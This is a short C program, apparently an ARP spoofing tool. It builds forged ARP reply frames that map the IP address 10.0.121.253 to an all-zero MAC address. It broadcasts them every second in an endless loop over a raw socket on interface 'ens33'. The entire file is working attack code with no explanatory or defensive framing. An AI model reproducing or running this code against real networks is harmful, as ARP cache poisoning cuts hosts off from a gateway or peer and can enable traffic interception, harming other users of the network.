#include<stdio.h>
#include<sys/socket.h>
#include<netpacket/packet.h>
#include<net/if_arp.h>
#include<arpa/inet.h>
#include<netinet/ether.h>
#include<sys/ioctl.h>
#include<unistd.h>
#include<netpacket/packet.h>
#include<net/if.h>
#include<string.h>
#include<pthread.h>
#include<net/ethernet.h>
int main()
{
unsigned char dst_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
unsigned char srt_mac[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
unsigned char dst_ip[6] = {10,0,121,237};
unsigned char srt_ip[6] = {10,0,121,253};
unsigned char msg[1500] = "";
struct ether_header *eth_hd  = (struct ether_header *)msg;
memcpy(eth_hd->ether_dhost,dst_mac,6);
memcpy(eth_hd->ether_shost,srt_mac,6);
eth_hd->ether_type = htons(0x0806);
struct arphdr *arp_hd = (struct arphdr*)(msg+14);
arp_hd->ar_hrd = htons(1);
arp_hd->ar_pro = htons(0x0800);
arp_hd->ar_hln = 6;
arp_hd->ar_pln = 4;
arp_hd->ar_op = htons(2);
memcpy(arp_hd->__ar_sha,srt_mac,6);
memcpy(arp_hd->__ar_sip,srt_ip,4);
memcpy(arp_hd->__ar_tha,dst_mac,6);
memcpy(arp_hd->__ar_tip,dst_ip,4);

	int fd = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
	int len = 42;
	struct ifreq ethreq;
	strncpy(ethreq.ifr_name,"ens33",IFNAMSIZ);
	ioctl(fd,SIOCGIFINDEX,&ethreq);
	struct sockaddr_ll sll;
	bzero(&sll,sizeof(sll));
	sll.sll_ifindex = ethreq.ifr_ifindex;
	while(1)
	{
	
	sendto(fd,msg,len,0,(struct sockaddr *)&sll,sizeof(sll));
	printf("sendto over\n");	
	sleep(1);
	}
	
	close(fd);	
	return 0;
}	
